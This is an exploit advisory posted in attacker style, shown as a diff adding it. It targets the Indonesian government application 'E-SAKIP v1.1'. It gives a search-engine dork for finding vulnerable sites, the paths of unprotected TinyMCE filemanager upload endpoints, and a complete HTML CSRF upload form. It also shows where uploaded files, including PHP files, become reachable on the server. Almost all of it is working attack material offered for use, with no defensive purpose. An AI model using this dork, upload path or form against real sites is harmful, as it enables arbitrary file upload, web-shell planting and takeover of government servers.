@@ -1,0 +1,46 @@
+[+]Exploit title: Aplikasi E - S A K I P v1.1 Indonesian Goverment File Manager File Upload
+[+]Author : Snopunks
+[+]Team: Bangka Crew
+[+]Dork : inurl:/portal/home/kontak_view
+--------------------------------------
+[+]==================================================================
+[+]Proof Of Concept:
+
+[+] Exploit 1 : site.com/plugins/tinymce/js/tinymce/plugins/filemanager/dialog.php
+
+You can upload your file Drop Files To Upload "Berkas Unggahan"
+
+[!] File Location :
+The files you upload will go to 
+ site.go.id/uploads/yourfile
+
+[+]==================================================================
+
+[+] Exploit 2 : site.com/plugins/tinymce/js/tinymce/plugins/filemanager/upload.php
+
+[+] CSRF : 
+#################################################################################    		
+<html>
+<head>
+<title>CSRF BY EXPLOIT HAXOR V2</title>
+</head>
+  <link href="https://fonts.googleapis.com/css?family=Electrolize" rel="stylesheet">
+<body bgcolor="#000d1a">
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><center><h3>-=[<font size="10.5px"><marquee scrollamount="9" behavior="alternate" width="55%"><font color="red">CSRF BY <font color="white">EXPLOIT
+<font color="white">HAXOR<font color="red"> V2</marquee></font>]=-</h3></center>
+<br><center>
+<font size="10">CSRF </h1><br><br>
+	<form method="POST" action="https://site.id/plugins/tinymce/js/tinymce/plugins/filemanager/upload.php" enctype="multipart/form-data">
+	<input type="file" name="file"><button>GenjodKenn!!!</button>
+	</form>
+</center>
+                  <center>
+       <font face="electrolize" size="4" color="silver">- Copyright &copy; Exploit Haxor-1337 -<br><br></font>
+                 </center>
+<br>
+</font>
+
+[!] File Location :
+The files you upload will go to 
+site.go.id/plugins/tinymce/js/tinymce/plugins/filemanager/yourfile.php
+#################################################################################
